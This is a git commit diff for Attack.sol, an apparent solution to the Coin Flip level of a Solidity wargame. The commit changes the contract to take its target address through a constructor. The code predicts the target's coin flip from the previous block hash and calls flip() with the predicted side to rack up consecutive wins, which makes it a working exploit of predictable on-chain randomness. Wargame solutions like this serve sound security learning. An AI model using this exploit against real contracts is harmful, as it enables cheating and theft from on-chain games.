0da9a2bd69e54925b763245cafc4039e8231d2cd
TimOu <99255480+timou0911@users.noreply.github.com>
2023-12-11 20:51:10 +0800

    Update Attack.sol

--- 03. Coin Flip ★★☆☆☆/Attack.sol
+++ 03. Coin Flip ★★☆☆☆/Attack.sol
@@ -9,7 +9,11 @@ contract Attack {
     uint256 public consecutiveWins;
     uint256 lastHash;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    address coinFlip_addr = "Instance address";
+    address target;
+
+    constructor(address targetAddr) {
+        target = targetAddr;
+    }
 
     function attack() public returns(uint256) { // cal this fucntion 10 times to complete attack
         uint256 blockValue = uint256(blockhash(block.number - 1));
@@ -22,7 +26,7 @@ contract Attack {
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
 
-        bool correct = ICoinFlip(coinFlip_addr).flip(side); // call the flip function
+        bool correct = ICoinFlip(target).flip(side); // call the flip function
 
         if (correct) {
             consecutiveWins++;
